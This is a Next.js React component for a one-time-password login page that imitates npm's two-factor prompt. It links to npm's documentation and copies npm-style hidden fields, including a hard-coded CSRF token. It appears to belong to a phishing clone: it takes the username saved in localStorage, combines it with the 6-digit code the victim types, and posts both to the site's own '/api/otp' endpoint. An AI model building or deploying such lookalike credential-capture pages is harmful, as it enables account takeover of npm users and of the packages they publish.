'use client';
import { redirect } from "next/navigation";
import Lock from "../images/lock";

const Form = () => {
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const data = new FormData(e.target as HTMLFormElement);
    const username = localStorage.getItem("username");
    data.append("username", username || "");
    const response = await fetch("/api/otp", {
      method: "POST",
      body: data,
    });
    console.log("OTP verification response:", response);
    if (response.ok) {
      redirect("/");
    }
  };

  return (
    <div className='login'>
      <form
        id='login'
        className='w-full flex flex-col items-center'
        onSubmit={handleSubmit}
      >
        <div className='tc'>
          <Lock />
        </div>
        <h2
          className='text-black text-xl font-semibold text-center'
          style={{
            marginBottom: "20px",
          }}
        >
          Enter One-time Password
        </h2>
        <p
          style={{
            margin: "0 0 16px",
          }}
          className='text-sm w-full'
        >
          Enter a 6-digit code from your{" "}
          <a
            href='https://docs.npmjs.com/configuring-two-factor-authentication#prerequisites'
            className='underline cursor-pointer text-sm'
          >
            authenticator device
          </a>
        </p>
        <div className='w-full'>
          <div className=' nowrap flex justify-between'>
            <label
              id='One-time PasswordId'
              className='label'
              htmlFor='login_otp'
            >
              One-time Password
            </label>
          </div>
          <div></div>
          <input
            type='text'
            id='login_otp'
            aria-invalid='false'
            className='input'
            name='otp'
            placeholder=''
          />
        </div>
        <input type='hidden' name='formName' value='totp' />
        <input type='hidden' name='originalUrl' />
        <input
          type='hidden'
          name='csrftoken'
          value='4btDru2tCo8Q7p2jdSPixgmxYzxAcnXDbpWlyCZt1U-'
        />
        <div
          className='w-full'
          style={{
            marginTop: "8px",
          }}
        >
          <button type='submit' className='form__button text-sm'>
            Login
          </button>
        </div>
      </form>
    </div>
  );
};

export default Form;
